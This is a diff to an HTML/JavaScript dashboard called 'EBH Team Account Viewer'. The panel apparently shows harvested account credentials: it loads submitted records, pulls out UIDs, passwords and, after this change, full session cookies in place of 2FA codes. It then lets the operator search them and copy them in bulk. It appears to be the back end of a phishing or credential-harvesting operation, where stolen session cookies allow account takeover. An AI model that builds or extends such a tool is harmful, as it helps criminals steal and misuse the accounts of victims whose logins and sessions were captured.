@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>EBH Team - Account Viewer</title>
+<title>EBH Team - Account Viewer (Cookie)</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -323,7 +323,7 @@ body {
   font-family: 'Courier New', monospace;
 }
 
-.tfa-cell {
+.cookie-cell {
   width: 250px;
   min-width: 250px;
   max-width: 250px;
@@ -434,13 +434,13 @@ body {
   background: var(--accent-dark);
 }
 
-.copy-2fa-btn {
+.copy-cookie-btn {
   background: var(--secondary);
   color: var(--dark-bg);
   font-weight: bold;
 }
 
-.copy-2fa-btn:hover {
+.copy-cookie-btn:hover {
   background: var(--secondary-dark);
 }
 
@@ -634,7 +634,7 @@ body {
     max-width: 120px;
   }
   
-  .tfa-cell {
+  .cookie-cell {
     width: 200px;
     min-width: 200px;
     max-width: 200px;
@@ -659,7 +659,7 @@ body {
 <div class="container">
   <div class="header">
     <h1><i class="fas fa-fire"></i> EBH TEAM WORK <i class="fas fa-users"></i></h1>
-    <div class="subtitle">UID, Password & 2FA Code Viewer</div>
+    <div class="subtitle">UID, Password & Full Cookie Viewer</div>
   </div>
   
   <div class="stats-card">
@@ -683,7 +683,7 @@ body {
   
   <div class="search-section">
     <div class="search-container">
-      <input type="text" id="searchInput" placeholder="Search by UID, Password or 2FA Code...">
+      <input type="text" id="searchInput" placeholder="Search by UID, Password or Full Cookie...">
       <button class="search-btn" onclick="searchByPassword()">
         <i class="fas fa-search"></i> SEARCH
       </button>
@@ -716,8 +716,8 @@ body {
       <button class="copy-btn-third copy-pass-btn" onclick="copyPasswords()">
         <i class="fas fa-key"></i> COPY PASS
       </button>
-      <button class="copy-btn-third copy-2fa-btn" onclick="copy2FA()">
-        <i class="fas fa-shield-alt"></i> COPY 2FA
+      <button class="copy-btn-third copy-cookie-btn" onclick="copyCookies()">
+        <i class="fas fa-cookie"></i> COPY FULL COOKIE
       </button>
     </div>
     
@@ -850,7 +850,7 @@ function renderAccountsTable(accounts) {
         <div class="header-cell serial-cell">#</div>
         <div class="header-cell uid-cell">UID</div>
         <div class="header-cell password-cell">PASSWORD</div>
-        <div class="header-cell tfa-cell">2FA CODE</div>
+        <div class="header-cell cookie-cell">FULL COOKIE</div>
       </div>
   `;
   
@@ -866,8 +866,8 @@ function renderAccountsTable(accounts) {
         <div class="row-cell password-cell">
           <div class="cell-content" title="${account.password || 'N/A'}">${account.password || 'N/A'}</div>
         </div>
-        <div class="row-cell tfa-cell">
-          <div class="cell-content" title="${account.tfa || 'No 2FA'}">${account.tfa || 'No 2FA'}</div>
+        <div class="row-cell cookie-cell">
+          <div class="cell-content" title="${account.full_cookie || 'No Cookie'}">${account.full_cookie || 'No Cookie'}</div>
         </div>
       </div>
     `;
@@ -896,16 +896,17 @@ function extractDataFromObject(obj) {
     }
   }
   
-  let tfa = "";
-  const tfaKeys = ['twofa_key', 'tfa', '2fa', 'twofa', 'twoFactor', 'auth', 'cookie', 'cookies', 'token'];
-  for (const key of tfaKeys) {
+  // ফুল কুকি বের করার জন্য আপডেটেড কী-গুলো
+  let full_cookie = "";
+  const cookieKeys = ['full_cookie', 'fullcookie', 'cookie', 'cookies', 'fullCookie', 'FullCookie', 'twofa_key', 'tfa', '2fa', 'twofa', 'auth', 'token'];
+  for (const key of cookieKeys) {
     if (obj[key] && obj[key].toString().trim()) {
-      tfa = obj[key].toString().trim();
+      full_cookie = obj[key].toString().trim();
       break;
     }
   }
   
-  return { uid, password, tfa };
+  return { uid, password, full_cookie };
 }
 
 function loadData() {
@@ -935,7 +936,7 @@ function loadData() {
           const submissionData = submissions[key];
           const extracted = extractDataFromObject(submissionData);
           
-          if (extracted.uid || extracted.password || extracted.tfa) {
+          if (extracted.uid || extracted.password || extracted.full_cookie) {
             allAccounts.push(extracted);
           }
         });
@@ -949,7 +950,7 @@ function loadData() {
           
           if (typeof obj === 'object') {
             const extracted = extractDataFromObject(obj);
-            if (extracted.uid || extracted.password || extracted.tfa) {
+            if (extracted.uid || extracted.password || extracted.full_cookie) {
               allAccounts.push(extracted);
             }
             
@@ -967,7 +968,7 @@ function loadData() {
       index === self.findIndex(a => 
         a.uid === account.uid && 
         a.password === account.password && 
-        a.tfa === account.tfa
+        a.full_cookie === account.full_cookie
       )
     );
     
@@ -1011,7 +1012,7 @@ function searchByPassword() {
   filteredAccounts = allAccounts.filter(account => 
     (account.password && account.password.toLowerCase().includes(searchTerm)) ||
     (account.uid && account.uid.toLowerCase().includes(searchTerm)) ||
-    (account.tfa && account.tfa.toLowerCase().includes(searchTerm))
+    (account.full_cookie && account.full_cookie.toLowerCase().includes(searchTerm))
   );
   
   isSearching = true;
@@ -1077,7 +1078,8 @@ function copyPasswords() {
     });
 }
 
-function copy2FA() {
+// কুকি কপি করার ফাংশন আপডেট করা হলো
+function copyCookies() {
   const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
   
   if (accountsToCopy.length === 0) {
@@ -1085,11 +1087,11 @@ function copy2FA() {
     return;
   }
   
-  const tfaCodes = accountsToCopy.map(account => account.tfa || "No 2FA").join("\n");
+  const cookies = accountsToCopy.map(account => account.full_cookie || "No Cookie").join("\n");
   
-  navigator.clipboard.writeText(tfaCodes)
+  navigator.clipboard.writeText(cookies)
     .then(() => {
-      const copyBtn = document.querySelector('.copy-2fa-btn');
+      const copyBtn = document.querySelector('.copy-cookie-btn');
       const originalText = copyBtn.innerHTML;
       copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
       copyBtn.style.background = "#c4712a";
@@ -1101,7 +1103,7 @@ function copy2FA() {
     })
     .catch(err => {
       console.error('Copy failed:', err);
-      alert("Failed to copy 2FA codes.");
+      alert("Failed to copy cookies.");
     });
 }
 
